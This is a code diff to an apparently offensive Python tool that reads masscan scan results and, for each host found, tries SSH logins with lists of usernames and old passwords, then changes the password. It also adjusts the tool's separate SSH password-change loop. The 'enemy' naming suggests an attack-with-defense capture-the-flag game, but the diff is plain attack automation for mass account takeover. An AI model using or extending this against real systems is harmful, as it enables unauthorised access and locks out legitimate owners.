@@ -19,12 +19,24 @@ class Tony():
     old_pwd: list
     new_pwd: str
     change: bool
+    mass_file: str
     output: str = None
     recorded: bool = False
     loop: LOOP = asyncio.get_event_loop()
 
     def attack(self):
         self.loop.add_signal_handler(signal.SIGTERM, self.signal_handler)
+        self.mass_res = set()
+        if self.change and self.mass_file:
+            try:
+                with open(self.mass_file, 'rb') as f:
+                    mass_data = f.read()
+                    for enemy in self.loop.run_until_complete(Javise.parse_masscan_results(mass_data)):
+                        status = self.loop.run_until_complete(Javise.change_enemy(enemy, self.usernames, self.old_pwd, self.new_pwd))
+                        if status:
+                            self.mass_res.add(enemy)
+            except BaseException as e:
+                print(f'[-]  {e}')
         self.alived_enemise = self.loop.run_until_complete(self.search_alive(self.enemise, self.loop))
         self.loop.run_until_complete(Javise.record(self.alived_enemise))
         if self.change:
@@ -33,7 +45,9 @@ class Tony():
     async def try2change_enemy(self):
         for enemy in filter(lambda x:'ssh' in x[1], self.alived_enemise.items()):
             enemy_name = enemy[0]
-            status = Javise.change_enemy(enemy_name, self.usernames, self.old_pwd, self.new_pwd)
+            if enemy_name in self.mass_res:
+                continue
+            status = await Javise.change_enemy(enemy_name, self.usernames, self.old_pwd, self.new_pwd)
             if status:
                 self.alived_enemise[enemy_name].append('change_seccess')
 
